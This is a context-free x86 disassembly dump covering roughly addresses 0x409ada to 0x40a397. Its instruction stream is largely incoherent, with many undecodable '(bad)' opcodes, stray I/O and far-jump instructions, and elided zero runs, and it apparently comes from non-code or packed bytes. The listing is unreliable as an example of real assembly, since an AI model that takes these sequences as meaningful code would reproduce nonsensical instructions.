  409ada:	cld    
  409adb:	or     esp,DWORD PTR [ecx+0x40]
  409ade:	outs   dx,DWORD PTR ds:[esi]
  409adf:	sbb    DWORD PTR [esi-0x7c],ecx
  409ae2:	mov    esp,0x2ffdb1fb
  409ae7:	inc    esi
  409ae8:	and    eax,0x258cbc00
  409aed:	test   BYTE PTR ds:0x45af8728,ah
  409af3:	(bad)
  409af7:	sbb    BYTE PTR [eax+ecx*1+0x73fc4100],ah
  409afe:	jmp    FWORD PTR [esi]
  409b00:	xor    BYTE PTR [ebp-0x49d9ed],cl
  409b06:	out    0x55,eax
  409b08:	test   BYTE PTR [edi],dl
  409b0a:	jmp    DWORD PTR [edx+0x4d]
  409b0d:	sub    DWORD PTR [ebx],edi
  409b0f:	call   0xaccb9b4e
  409b14:	(bad)  
  409b15:	cmp    BYTE PTR [eax],0xe9
  409b18:	scas   eax,DWORD PTR es:[edi]
  409b19:	cld    
  409b1a:	call   0x40d6de
  409b1f:	mov    ds,WORD PTR es:[ebx]
  409b22:	add    cl,ch
  409b24:	cmp    al,BYTE PTR [eax]
  409b26:	lea    esp,[eax+eax*1]
	...
  409b39:	add    BYTE PTR [eax],al
  409b3b:	add    BYTE PTR [ecx],ah
  409b3d:	mov    al,0xfe
  409b3f:	pop    esp
  409b40:	test   eax,0x51f97516
  409b45:	lea    eax,[edi]
  409b47:	ror    DWORD PTR [esi+edx*1-0x1],1
  409b4b:	mov    esi,0x348318ad
  409b50:	xor    DWORD PTR [eax],eax
  409b52:	je     0x409b5e
  409b54:	(bad)  
  409b56:	cmp    ebp,DWORD PTR [eax]
  409b58:	cmp    eax,0x529d7517
  409b5d:	mov    ch,BYTE PTR [ebx-0x17]
  409b60:	cmp    cl,BYTE PTR [ebx]
  409b62:	rcl    BYTE PTR [esi+esi*1],0xa8
  409b66:	push   edx
  409b67:	lds    edi,FWORD PTR [ebx+0x17]
  409b6a:	(bad)  
  409b6b:	hlt    
  409b6c:	inc    esi
  409b6d:	sub    BYTE PTR [ecx+0x2],bh
  409b70:	cmp    eax,0x21248900
  409b75:	sub    eax,DWORD PTR [edi]
  409b77:	xchg   DWORD PTR cs:[ebx],ebp
  409b7a:	add    cl,ch
  409b7c:	cmp    al,BYTE PTR [eax]
  409b7e:	adc    esp,0x5e
  409b81:	add    BYTE PTR [ecx+esi*8-0x1e],dh
  409b85:	(bad)  
  409b86:	(bad)  
  409b87:	dec    DWORD PTR [edi+0xc75feb9]
  409b8d:	jmp    0x409bd5
  409b8f:	xchg   ebp,eax
  409b90:	dec    edi
  409b91:	clc    
  409b92:	(bad)  
  409b93:	jne    0x409bf1
  409b95:	clc    
  409b96:	je     0x409ba4
  409b98:	sub    BYTE PTR [ecx-0x15e0006c],bl
  409b9e:	mov    al,BYTE PTR [eax]
	...
  409bb4:	loopne 0x409bb8
  409bb6:	mov    eax,DWORD PTR [ebp-0x1c]
  409bb9:	jnp    0x409bf3
  409bbb:	add    BYTE PTR [ebp+0x16],ah
  409bbe:	call   0x436c49
  409bc3:	(bad)  
  409bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bc5:	cli    
  409bc6:	(bad)  
  409bc7:	jmp    eax
  409bc9:	add    al,bh
  409bcb:	inc    ebp
  409bcc:	in     al,0xfb
  409bce:	(bad)  
  409bcf:	call   eax
  409bd1:	aad    0x44
  409bd3:	lock mov al,ds:0xd000002
  409bd9:	inc    ecx
  409bda:	out    dx,eax
  409bdb:	push   eax
  409bdc:	sub    eax,0xd50f341
  409be1:	inc    ecx
  409be2:	not    DWORD PTR [eax-0x31]
  409be5:	jo     0x409bfa
  409be7:	inc    DWORD PTR [ebp+0x4]
  409bea:	call   0xff2f7ad0
  409bef:	sbb    DWORD PTR ds:0x9373ffe8,0xffffff81
  409bf6:	jge    0x409bf0
  409bf8:	pusha  
  409bf9:	xchg   BYTE PTR [ebx+eax*4],ch
  409bfc:	cmp    eax,0x5674fff0
  409c01:	cmp    DWORD PTR [ebp-0x10],0xff208660
  409c08:	inc    ebp
  409c09:	cli    
  409c0a:	(bad)  
  409c0b:	jne    0x409c59
  409c0d:	jmp    0x75fe:0xeedf953c
  409c14:	cmp    DWORD PTR [ebx+0x7516],esi
	...
  409c2a:	add    BYTE PTR [eax],al
  409c2c:	cmp    eax,0x2694d1bf
  409c31:	mov    edi,0xd7297516
  409c36:	nop
  409c37:	or     esp,DWORD PTR [ecx]
  409c39:	pop    es
  409c3a:	jno    0x409c3b
  409c3c:	push   cs
  409c3d:	out    0x90,eax
  409c3f:	not    DWORD PTR [ecx]
  409c41:	xor    al,0x7b
  409c43:	(bad)  
  409c44:	(bad)  
  409c45:	not    BYTE PTR [eax+0x7b3be1f3]
  409c4b:	(bad)  
  409c4c:	out    dx,al
  409c4d:	push   es
  409c4e:	xchg   ecx,eax
  409c4f:	out    dx,eax
  409c50:	rol    DWORD PTR [ebx+0x7b],1
  409c53:	(bad)  
  409c54:	fisub  WORD PTR [esi+0xa]
  409c57:	inc    DWORD PTR [esi-0x5c]
  409c5a:	test   al,0xfe
  409c5c:	into   
  409c5d:	cmp    BYTE PTR es:[ebp-0x2b],0x27
  409c62:	(bad)  
  409c63:	sbb    eax,0x75162753
  409c68:	inc    ebp
  409c69:	aas    
  409c6a:	outs   dx,DWORD PTR ds:[esi]
  409c6b:	xchg   esp,eax
  409c6c:	scas   al,BYTE PTR es:[edi]
  409c6d:	inc    esi
  409c6e:	test   eax,0x7d4a7ff
  409c73:	call   0xff56482b
  409c78:	and    esp,DWORD PTR [edi]
  409c7a:	push   ss
  409c7b:	jne    0x409cba
  409c7d:	aas    
  409c7e:	adc    DWORD PTR [esi+eax*4+0x7d75165e],0x6f
  409c86:	es xchg edi,eax
  409c88:	jbe    0x409cf8
  409c8a:	lds    ecx,FWORD PTR [edx]
  409c8c:	cmp    BYTE PTR ss:[di+0x0],0x0
	...
  409ca3:	add    BYTE PTR [edi+0x7e],ah
  409ca6:	push   ss
  409ca7:	pop    edi
  409ca8:	dec    DWORD PTR [edi+0x41]
  409cab:	adc    BYTE PTR [ecx],bh
  409cad:	hlt    
  409cae:	mov    ch,ah
  409cb0:	mov    edx,0x46561f5b
  409cb5:	add    ah,bl
  409cb7:	or     edx,DWORD PTR [ecx+0x6d]
  409cba:	outs   dx,BYTE PTR ds:[esi]
  409cbb:	push   ss
  409cbc:	xchg   DWORD PTR ss:[edi+ecx*1-0xcab6d46],ebp
  409cc4:	stos   DWORD PTR es:[edi],eax
  409cc5:	or     al,BYTE PTR [ecx-0x16ffc6fc]
  409ccb:	mov    ch,0x1
  409ccd:	inc    edx
  409cce:	loope  0x409cd3
  409cd0:	push   cs
  409cd1:	mov    esp,eax
  409cd3:	sub    esp,DWORD PTR [esi+ebp*2-0x4509e9da]
  409cda:	and    BYTE PTR [ecx+edi*1],al
  409cdd:	add    cl,ch
  409cdf:	mov    BYTE PTR [eax+ebx*1-0x47],dh
  409ce3:	push   ss
  409ce4:	ins    BYTE PTR es:[edi],dx
  409ce5:	or     BYTE PTR [ecx],dl
  409ce7:	fmulp  st(0),st
  409ce9:	adc    al,0xfe
  409ceb:	mov    edi,DWORD PTR [esp+edx*1+0x6a]
  409cef:	cwde   
  409cf0:	(bad)  
  409cf1:	push   DWORD PTR [edi+eax*1-0x46]
  409cf5:	xchg   edx,eax
  409cf6:	in     al,0x2
  409cf8:	dec    ebx
  409cf9:	(bad)  
  409cfa:	imul   edx,DWORD PTR [edi+0xa5efdb2],0x3e8fef1
  409d04:	cmp    DWORD PTR [esi+0x42af],esi
	...
  409d1a:	add    BYTE PTR [eax],al
  409d1c:	xor    DWORD PTR [eax],eax
  409d1e:	ins    BYTE PTR es:[edi],dx
  409d1f:	mov    edi,0x8fb5af8e
  409d24:	sub    BYTE PTR ss:[ebp+0x6a148673],ch
  409d2b:	xchg   edi,eax
  409d2c:	xchg   bh,bh
  409d2e:	adc    al,0x0
  409d30:	inc    edx
  409d31:	inc    eax
  409d32:	sbb    eax,0xe8feb10a
  409d37:	add    edi,DWORD PTR [ecx]
  409d39:	mov    dh,0xaf
  409d3b:	inc    edx
  409d3c:	xor    DWORD PTR [eax],eax
  409d3e:	push   0xffffff97
  409d40:	push   edx
  409d41:	cli    
  409d42:	(bad)  
  409d43:	cli    
  409d44:	inc    ebp
  409d45:	add    DWORD PTR [ebp+0x71],0xffffff8d
  409d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d4a:	pop    ss
  409d4b:	data16 scas al,BYTE PTR es:[edi]
  409d4d:	cld    
  409d4e:	out    0xc1,eax
  409d50:	test   al,0x13
  409d52:	jmp    DWORD PTR [esi+ebp*8+0xb]
  409d56:	push   eax
  409d57:	dec    esi
  409d58:	mov    dh,0xfb
  409d5a:	out    0x31,eax
  409d5c:	stos   BYTE PTR es:[edi],al
  409d5d:	adc    edi,edi
  409d5f:	jo     0x409d37
  409d61:	pop    ds
  409d62:	jmp    0x409d38
  409d64:	mov    bh,0xbd
  409d66:	neg    DWORD PTR [ecx+0x11078d2d]
  409d6c:	ins    BYTE PTR es:[edi],dx
  409d6d:	jno    0x409d6e
  409d6f:	push   ds
  409d70:	ret    0xe3bd
  409d73:	fs scas al,BYTE PTR es:[edi]
  409d75:	or     edx,DWORD PTR [eax-0x7d]
  409d78:	out    0x12,al
  409d7a:	jne    0x409d6d
  409d7c:	adc    ah,dh
  409d7e:	xchg   ecx,eax
  409d7f:	inc    BYTE PTR [eax]
	...
  409d91:	add    BYTE PTR [eax],al
  409d93:	add    BYTE PTR ds:0x8af14585,ch
  409d99:	adc    dh,BYTE PTR [ebp-0x1f]
  409d9c:	adc    ch,BYTE PTR [edi]
  409d9e:	cli    
  409d9f:	out    0x25,al
  409da1:	jg     0x409e20
  409da3:	lds    edi,FWORD PTR [ebx]
  409da5:	lea    ebx,ds:0x500bef64
  409dab:	into   
  409dac:	mov    bh,0x17
  409dae:	(bad)  
  409daf:	cmp    al,0x31
  409db1:	adc    esi,DWORD PTR [ebp-0xf]
  409db4:	bound  esp,QWORD PTR [edx-0x3]
  409db7:	mov    dh,0x25
  409db9:	test   DWORD PTR [ebp-0x4f],eax
  409dbc:	retf   0x7512
  409dbf:	icebp  
  409dc0:	push   edx
  409dc1:	arpl   dx,di
  409dc3:	sahf   
  409dc4:	dec    ebp
  409dc5:	jg     0x409e44
  409dc7:	xchg   ecx,eax
  409dc8:	cmp    cl,BYTE PTR [ebp+0x3a5109]
  409dce:	add    BYTE PTR [eax],al
  409dd0:	push   eax
  409dd1:	dec    ebp
  409dd2:	enter  0x48c2,0xff
  409dd6:	mov    WORD PTR [ebp-0x38],es
  409dd9:	dec    esi
  409dda:	(bad)  
  409ddb:	jne    0x409db1
  409ddd:	jmp    0x409e53
  409ddf:	or     al,0xd7
  409de1:	add    DWORD PTR [edi],0xfeeaa0e8
  409de7:	jmp    DWORD PTR [ebx+0xd00f76a]
  409ded:	or     DWORD PTR [eax-0xf000],edi
  409df3:	pop    ebp
  409df4:	dec    ecx
  409df5:	rol    DWORD PTR [edi],0x0
	...
  409e0c:	xchg   ebp,eax
  409e0d:	push   edx
  409e0e:	not    DWORD PTR [eax+0x57]
  409e11:	add    BYTE PTR [edi],0xe8
  409e14:	sbb    BYTE PTR [esi-0x10940002],cl
  409e1a:	call   0x3f7f1a
  409e1f:	dec    ch
  409e21:	push   es
  409e22:	call   0xff2d210e
  409e27:	cmp    ebx,DWORD PTR [ebp+0x39057502]
  409e2d:	add    al,0x0
  409e2f:	add    al,dl
  409e31:	jg     0x409eb0
  409e33:	cld    
  409e34:	into   
  409e35:	ins    BYTE PTR es:[edi],dx
  409e36:	and    ecx,DWORD PTR [ebp-0xaffba3]
  409e3c:	or     eax,0x210de714
  409e41:	out    dx,eax
  409e42:	dec    BYTE PTR [ebp-0xaffbb3]
  409e48:	dec    ebp
  409e49:	adc    al,0xe7
  409e4b:	cmp    cl,dl
  409e4d:	out    dx,al
  409e4e:	dec    BYTE PTR [ebp-0xaffba3]
  409e54:	sbb    eax,0x9a2ee714
  409e59:	out    dx,al
  409e5a:	dec    BYTE PTR [ebp+0x500be439]
  409e60:	data16 jmp 0x409e5e
  409e63:	out    0x8a,eax
  409e65:	jge    0x409e7a
  409e67:	inc    eax
  409e69:	fist   DWORD PTR [ebx]
  409e6b:	(bad)  
  409e6c:	hlt    
  409e6d:	nop
  409e6e:	mov    bl,0xfe
	...
  409e84:	int3   
  409e85:	and    BYTE PTR [ebx],bl
  409e87:	les    eax,FWORD PTR [edx-0x67]
  409e8a:	adc    cl,BYTE PTR [ecx+0x4580c37c]
  409e90:	xor    DWORD PTR [eax+0x12],ebx
  409e93:	jne    0x409ec6
  409e95:	mov    edi,0xbb1efb58
  409e9a:	jl     0x409ee1
  409e9c:	and    DWORD PTR [edi+0x5339ef90],esp
  409ea2:	xchg   esi,eax
  409ea3:	add    BYTE PTR [ebx+edx*8-0x59738bfd],0x90
  409eab:	out    0x39,eax
  409ead:	imul   ebp,DWORD PTR [edx+0x3ef6c82],0x74
  409eb4:	pop    eax
  409eb5:	jg     0x409e66
  409eb7:	cmp    edi,DWORD PTR [eax+0x27]
  409eba:	adc    dh,BYTE PTR [ebp-0x37]
  409ebd:	out    dx,eax
  409ebe:	dec    esi
  409ebf:	push   0xbffe2739
  409ec4:	dec    esp
  409ec5:	inc    ecx
  409ec6:	fwait
  409ec7:	dec    edx
  409ec8:	std    
  409ec9:	out    0x3,eax
  409ecb:	jmp    FWORD PTR [edi+esi*1]
  409ece:	sbb    ebp,DWORD PTR [edx+0xb032721]
  409ed4:	jns    0x409e82
  409ed6:	add    BYTE PTR [eax+0xa],ch
  409ed9:	sti    
  409eda:	(bad)  
  409edb:	call   DWORD PTR [edi-0x4f17ec34]
  409ee1:	mov    edi,0x67320003
  409ee6:	xchg   edi,eax
  409ee7:	sub    eax,0x0
	...
  409efc:	adc    DWORD PTR [eax],eax
  409efe:	jmp    0x9e930506
  409f03:	cwde   
  409f04:	inc    edx
  409f05:	sub    BYTE PTR [esi+esi*2],bl
  409f08:	adc    WORD PTR [esi-0x3eeb168],cx
  409f0f:	call   FWORD PTR [esi+0x44]
  409f12:	pop    ebx
  409f13:	adc    cl,BYTE PTR [esi+0x11]
  409f16:	cld    
  409f17:	pop    ds
  409f18:	inc    esi
  409f19:	mov    ebx,esp
  409f1b:	sbb    edi,DWORD PTR [eax+0x6e]
  409f1e:	data16 adc dh,BYTE PTR [esi]
  409f21:	mov    edx,DWORD PTR [eax+0x12]
  409f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f25:	add    al,0x41
  409f27:	pop    ecx
  409f28:	retf   
  409f29:	adc    BYTE PTR [esi+0x12],cl
  409f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f2d:	adc    BYTE PTR [ecx+0x46],dl
  409f30:	lods   al,BYTE PTR ds:[esi]
  409f31:	adc    BYTE PTR [esi],bh
  409f33:	adc    al,BYTE PTR [esp+0x10ac4e41]
  409f3a:	adc    al,BYTE PTR cs:[eax+ebp*1+0x10cc5611]
  409f42:	push   ds
  409f43:	sar    DWORD PTR [ebx+0x6d031092],0x8
  409f4a:	loop   0x409f65
  409f4c:	cs jnp 0x409f4d
  409f4f:	adc    dh,dl
  409f51:	adc    BYTE PTR [edx-0x38],dh
  409f54:	(bad)  
  409f55:	mov    cl,0x1f
  409f57:	inc    ebp
  409f58:	xor    DWORD PTR [eax],eax
  409f5a:	xchg   esp,eax
  409f5b:	jle    0x409f2a
  409f5d:	jl     0x409f0c
  409f5f:	adc    BYTE PTR [eax],al
	...
  409f71:	add    BYTE PTR [eax],al
  409f73:	add    BYTE PTR [esi+0x21bec8a],dh
  409f79:	pop    eax
  409f7a:	(bad)  
  409f7b:	adc    DWORD PTR [edx],esi
  409f7d:	inc    eax
  409f7e:	push   esp
  409f7f:	shr    DWORD PTR [ebp-0x614b3b46],1
  409f85:	cs ins DWORD PTR es:[edi],dx
  409f87:	adc    DWORD PTR [esi+0x293c0010],ecx
  409f8d:	adc    DWORD PTR [ebp-0x23],esi
  409f90:	and    cl,BYTE PTR [ecx-0x72]
  409f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f94:	dec    eax
  409f95:	add    eax,0x116815c0
  409f9a:	jne    0x409f7d
  409f9c:	dec    ecx
  409f9d:	mov    edi,ebx
  409f9f:	xor    DWORD PTR [eax+0x5486ff12],0xb2d97550
  409fa9:	adc    BYTE PTR [edi],cl
  409fab:	xchg   bl,ch
  409fad:	adc    BYTE PTR [ebp-0x23],dh
  409fb0:	sub    DWORD PTR [ebx+0x579b5107],ecx
  409fb6:	call   FWORD PTR [esi+0x48]
  409fb9:	xchg   ebp,eax
  409fba:	sti    
  409fbb:	inc    ecx
  409fbc:	jne    0x40a03a
  409fbe:	dec    DWORD PTR [esi+0x62]
  409fc1:	inc    edx
  409fc2:	or     cl,ch
  409fc4:	iret   
  409fc5:	jp     0x409fb3
  409fc7:	push   0x36fe5481
  409fcc:	sub    BYTE PTR [edi-0x7b],al
  409fcf:	jno    0x409ffc
  409fd1:	ud0    ebp,ecx
  409fd4:	cmp    al,BYTE PTR [eax]
  409fd6:	add    BYTE PTR [edx+0x0],dh
	...
  409fe9:	add    BYTE PTR [eax],al
  409feb:	add    dh,dh
  409fed:	sti    
  409fee:	or     ch,BYTE PTR [ecx]
  409ff0:	rol    DWORD PTR [eax+eax*4],0xd1
  409ff4:	cmp    dl,BYTE PTR [ebp+0x8a1004]
  409ffa:	add    cl,ch
  409ffc:	sub    DWORD PTR [ebp+0x6039010b],edx
  40a002:	(bad)  
  40a003:	out    dx,al
  40a004:	mov    ebp,0xd2f6754f
  40a009:	ss sub al,0x28
  40a00c:	xor    eax,0x42e5750f
  40a011:	pop    ecx
  40a012:	cwde   
  40a013:	into   
  40a014:	dec    ecx
  40a015:	sbb    ecx,DWORD PTR ds:0x2bcfe800
  40a01b:	inc    ecx
  40a01c:	mov    al,ds:0x780c74f0
  40a021:	popf   
  40a022:	xchg   edi,eax
  40a023:	dec    edi
  40a025:	mov    al,BYTE PTR [eax+edi*4+0x68fef09e]
  40a02c:	mov    es,WORD PTR [edx]
  40a02e:	add    BYTE PTR [eax],al
  40a030:	fld    QWORD PTR [ebp-0xf50013e]
  40a036:	dec    edi
  40a037:	call   0x3f36ae
  40a03c:	fld    QWORD PTR [ebp-0x1030013e]
  40a042:	dec    edi
  40a043:	inc    DWORD PTR ds:0x9ffffdbb
  40a049:	jmp    0x40a098
  40a04b:	data16 and BYTE PTR [ebx],al
  40a04e:	mov    DWORD PTR [ebp+0x0],eax
	...
  40a064:	int3   
  40a065:	lock (bad) 
  40a067:	call   eax
  40a069:	inc    DWORD PTR [ebx+0x320f3]
  40a06f:	lea    esp,[ebp-0x3b]
  40a072:	std    
  40a073:	dec    DWORD PTR [edi-0x18]
  40a076:	add    DWORD PTR [eax],edx
  40a078:	adc    BYTE PTR [ebx],al
  40a07a:	add    BYTE PTR [ebp+ebx*4-0x73],dh
  40a07e:	inc    ecx
  40a07f:	sub    al,0xb0
  40a081:	push   0xffffffd1
  40a083:	sub    al,0x91
  40a085:	add    ch,al
  40a087:	sub    esi,DWORD PTR [esi+0x200b0002]
  40a08d:	jbe    0x40a093
  40a08f:	jmp    0x40a3fd
  40a094:	pop    ebp
  40a095:	xchg   esi,eax
  40a096:	sar    esi,0xcf
  40a099:	dec    BYTE PTR [edx+eax*2-0x2b98abb4]
  40a0a0:	cmp    al,0x45
  40a0a2:	jmp    edi
  40a0a4:	cmp    DWORD PTR [edi],esp
  40a0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a7:	call   FWORD PTR [esi+0x3c754321]
  40a0ad:	xor    BYTE PTR [eax+0xe193900],al
  40a0b3:	jne    0x40a0ea
  40a0b5:	inc    ecx
  40a0b6:	mov    al,ds:0xfb5d7e9e
  40a0bb:	mov    edi,0xe59b15ec
  40a0c0:	and    eax,ebx
  40a0c2:	add    edi,edi
  40a0c4:	in     al,dx
  40a0c5:	and    al,0x1b
  40a0c7:	or     DWORD PTR [eax],eax
	...
  40a0d9:	add    BYTE PTR [eax],al
  40a0db:	add    cl,al
  40a0dd:	jge    0x40a0ee
  40a0df:	jmp    0x40a124
  40a0e1:	repz add edi,edi
  40a0e4:	les    ebx,FWORD PTR [ebx+ebx*1]
  40a0e7:	std    
  40a0e8:	scas   al,BYTE PTR es:[edi]
  40a0e9:	xchg   ebp,eax
  40a0ea:	push   cs
  40a0eb:	lea    esp,[edx+ebx*2-0x6ac900f2]
  40a0f2:	mov    cl,0x2b
  40a0f4:	mov    eax,DWORD PTR [edi+0x1b]
  40a0f7:	inc    ecx
  40a0f8:	shl    DWORD PTR [esi+0x351e500e],0xf3
  40a0ff:	dec    edi
  40a100:	push   ss
  40a101:	dec    ebp
  40a102:	sti    
  40a103:	out    0x13,eax
  40a105:	into   
  40a106:	push   cs
  40a107:	call   DWORD PTR [ecx]
  40a109:	adc    al,0x77
  40a10b:	(bad)  
  40a10c:	inc    dl
  40a10e:	ret    0x7b8c
  40a111:	xor    edi,DWORD PTR [ebp+eax*4-0x5b]
  40a115:	in     eax,dx
  40a116:	push   cs
  40a117:	jmp    esi
  40a119:	ins    BYTE PTR es:[edi],dx
  40a11a:	repz (bad) 
  40a11c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11d:	mov    bl,0xd
  40a11f:	call   esi
  40a121:	out    dx,eax
  40a122:	dec    esi
  40a123:	cmp    WORD PTR [edi],dx
  40a126:	cli    
  40a127:	mov    edi,0xe59b3f4d
  40a12c:	adc    DWORD PTR [eax+0x3],ebx
  40a12f:	jmp    FWORD PTR [eax+eax*1]
  40a132:	cmc    
  40a133:	sbb    ebp,eax
  40a135:	jne    0x40a115
  40a137:	push   cs
  40a138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a139:	push   ebx
  40a13a:	popf   
  40a13b:	or     eax,0x1c390d9e
	...
  40a154:	nop
  40a155:	jne    0x40a11d
  40a157:	push   cs
  40a158:	jmp    0x3ed95f0c
  40a15d:	sbb    BYTE PTR [ecx+0xe],cl
  40a160:	jle    0x40a16f
  40a162:	rcl    DWORD PTR [esi],0xca
  40a165:	or     eax,0x42b480a6
  40a16a:	lahf   
  40a16b:	push   cs
  40a16c:	data16 mov al,0x95
  40a16f:	pop    eax
  40a170:	popf   
  40a171:	push   cs
  40a172:	mov    cs,WORD PTR [esi]
  40a174:	popa   
  40a175:	fwait
  40a176:	or     eax,DWORD PTR [ecx+edi*1]
  40a179:	sub    DWORD PTR [ecx+0x75e8bdfe],0xe
  40a180:	ds or  eax,0xd374f34
  40a186:	sbb    bx,WORD PTR [ecx+0x2603e8a3]
  40a18d:	push   ebx
  40a18e:	xchg   ecx,eax
  40a18f:	or     eax,0x46410d1e
  40a194:	stos   BYTE PTR es:[edi],al
  40a195:	or     al,0x46
  40a197:	cmp    al,0xfb
  40a199:	sti    
  40a19a:	call   0x685c5557
  40a19f:	inc    edi
  40a1a0:	leave  
  40a1a1:	or     eax,0x82fe0e2e
  40a1a6:	popa   
  40a1a7:	or     eax,0x3e90cee
  40a1ac:	cmp    DWORD PTR [eax],eax
  40a1ae:	(bad)  
  40a1af:	enter  0xf932,0x28
  40a1b3:	xchg   edi,eax
  40a1b4:	cmp    eax,0x3c180
	...
  40a1c9:	add    BYTE PTR [eax],al
  40a1cb:	add    BYTE PTR [ebx+eax*1+0x10],al
  40a1cf:	cld    
  40a1d0:	cmp    DWORD PTR [eax],eax
  40a1d2:	add    cl,ch
  40a1d4:	mov    ds:0x3aa82c35,al
  40a1d9:	or     eax,0xcf52f575
  40a1de:	xchg   esi,eax
  40a1df:	fidiv  WORD PTR [edi+esi*2]
  40a1e2:	test   DWORD PTR [ecx+0x41ff0d2f],edx
  40a1e8:	xchg   edi,edi
  40a1ea:	(bad)  
  40a1eb:	call   0xc00324ff
  40a1f0:	xor    al,0xd
  40a1f2:	push   eax
  40a1f3:	shl    edx,0x70
  40a1f6:	jmp    FWORD PTR [esi-0x583d7d0a]
  40a1fc:	cmp    al,0xd
  40a1fe:	push   eax
  40a1ff:	sahf   
  40a200:	push   cs
  40a201:	dec    eax
  40a202:	(bad)  
  40a203:	xchg   esi,eax
  40a204:	sub    al,0x18
  40a206:	in     eax,0x5
  40a208:	cmp    eax,0xe96c8900
  40a20d:	or     eax,0xfd7d7eff
  40a212:	sub    DWORD PTR [edi+0x5c000035],0xffffffae
  40a219:	ds (bad) 
  40a21b:	data16 cmp al,0x13
  40a21e:	add    bh,cl
  40a220:	cmp    al,BYTE PTR [eax]
  40a222:	add    dh,ah
  40a224:	mov    dh,0x7b
  40a226:	add    cl,ch
  40a228:	cmp    bh,BYTE PTR [ebp-0x6b]
  40a22b:	sub    edi,DWORD PTR [edi]
  40a22d:	or     edi,edi
  40a22f:	ins    BYTE PTR es:[edi],dx
	...
  40a244:	sti    
  40a245:	xlat   BYTE PTR ds:[ebx]
  40a246:	dec    edi
  40a247:	ror    DWORD PTR [eax-0x24],0x40
  40a24b:	jmp    0xe9a4eaa2
  40a250:	cmp    dh,bh
  40a252:	mov    edi,0x75173894
  40a257:	fs data16 dec BYTE PTR ds:[esi]
  40a25c:	inc    esp
  40a25d:	jge    0x40a2a1
  40a25f:	add    ah,ah
  40a261:	dec    edi
  40a262:	addr16 aam 0xf4
  40a265:	notrack jmp edi
  40a268:	pop    ax
  40a26a:	(bad)  
  40a26b:	call   FWORD PTR [ebx-0x74fd8b41]
  40a271:	pop    eax
  40a272:	mov    WORD PTR [ebp-0x1022e],ss
  40a278:	adc    eax,0x1d892b41
  40a27d:	mov    bl,0xfd
  40a27f:	push   DWORD PTR [edi+0x67]
  40a282:	in     eax,0x28
  40a284:	push   ecx
  40a285:	add    al,0xff
  40a287:	jne    0x40a21d
  40a289:	out    0x98,eax
  40a28b:	xchg   esi,eax
  40a28c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a28d:	cld    
  40a28e:	(bad)  
  40a28f:	mov    ch,0xc
  40a291:	std    
  40a292:	(bad)  
  40a293:	jmp    DWORD PTR [eax]
  40a295:	in     al,dx
  40a296:	loopne 0x40a22e
  40a298:	(bad)  
  40a299:	cld    
  40a29a:	mov    BYTE PTR [ebp-0x10310],al
  40a2a0:	xor    BYTE PTR [edx+eiz*2+0x3c],ch
  40a2a4:	adc    DWORD PTR [edi+edi*8],eax
  40a2a7:	mov    ch,0x0
	...
  40a2bd:	std    
  40a2be:	(bad)  
  40a2bf:	(bad)  
  40a2c0:	mov    eax,0x2000646f
  40a2c5:	or     BYTE PTR [edi+0x68672374],bh
  40a2cb:	cmp    al,0xd1
  40a2cd:	(bad)  
  40a2ce:	(bad)  
  40a2cf:	mov    ch,0xb0
  40a2d1:	cld    
  40a2d2:	(bad)  
  40a2d3:	push   DWORD PTR [edi+0x72]
  40a2d6:	pop    es
  40a2d7:	call   0x3f9cd5
  40a2dc:	js     0x40a296
  40a2de:	xchg   ecx,eax
  40a2df:	jmp    DWORD PTR [edi]
  40a2e1:	mov    al,BYTE PTR [edx+eax*8+0x50fefc16]
  40a2e8:	inc    edi
  40a2e9:	mov    dl,0xbb
  40a2eb:	(bad)  
  40a2ec:	cmp    edx,esi
  40a2ee:	or     ebp,eax
  40a2f0:	or     BYTE PTR [ebp-0x274bfffd],al
  40a2f6:	sti    
  40a2f7:	test   BYTE PTR [edx+ecx*1+0xb],bh
  40a2fb:	(bad)  
  40a2fc:	mov    esi,0xb6fe4ecb
  40a301:	sbb    DWORD PTR [edx],ebx
  40a303:	and    al,0x15
  40a305:	sbb    DWORD PTR [ebx],eax
  40a307:	(bad)  
  40a308:	in     al,dx
  40a309:	pusha  
  40a30a:	or     bh,bh
  40a30c:	sahf   
  40a30d:	inc    eax
  40a30e:	jg     0x40a2a2
  40a310:	xchg   esi,eax
  40a311:	cmp    DWORD PTR ds:0xb01941c2,edi
  40a317:	mov    dl,BYTE PTR [ebp-0x6ef46eb7]
  40a31d:	pop    ebp
  40a31e:	jb     0x40a31f
	...
  40a334:	jbe    0x40a353
  40a336:	inc    ebx
  40a337:	je     0x40a377
  40a339:	leave  
  40a33a:	mov    bl,0xfe
  40a33c:	in     al,dx
  40a33d:	adc    BYTE PTR [ebx],bl
  40a33f:	stos   DWORD PTR es:[edi],eax
  40a340:	pop    edi
  40a341:	jno    0x40a34e
  40a343:	call   0xff4b2a28
  40a348:	adc    BYTE PTR [esi-0x4],0xff
  40a34c:	in     eax,dx
  40a34d:	lea    edx,[edi]
  40a34f:	xor    DWORD PTR [ebp-0x6c],0xffffff9d
  40a353:	jmp    DWORD PTR [eax+0x41750a38]
  40a359:	scas   eax,DWORD PTR es:[edi]
  40a35a:	jle    0x40a2eb
  40a35c:	es stos DWORD PTR es:[edi],eax
  40a35e:	jl     0x40a3a5
  40a360:	sbb    eax,0x8cfeed3e
  40a365:	pop    ds
  40a366:	sbb    edi,DWORD PTR [edi+0x6a0ac30e]
  40a36c:	pop    edx
  40a36d:	retf   0x790
  40a370:	adc    DWORD PTR [ebp+0x3df6ff0a],ecx
  40a376:	out    0xfe,eax
  40a378:	fs add cl,dh
  40a37b:	sbb    edx,DWORD PTR [edx+0x530b1e09]
  40a381:	add    BYTE PTR [ecx-0x1740ea82],al
  40a387:	fwait
  40a388:	dec    ebx
  40a389:	int3   
  40a38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a38b:	add    eax,esi
  40a38d:	shl    DWORD PTR [ebx-0x24],cl
  40a390:	jns    0x40a392
  40a392:	add    edi,edx
  40a394:	int    0x9
  40a396:	out    dx,al
  40a397:	inc    BYTE PTR [eax]
	...
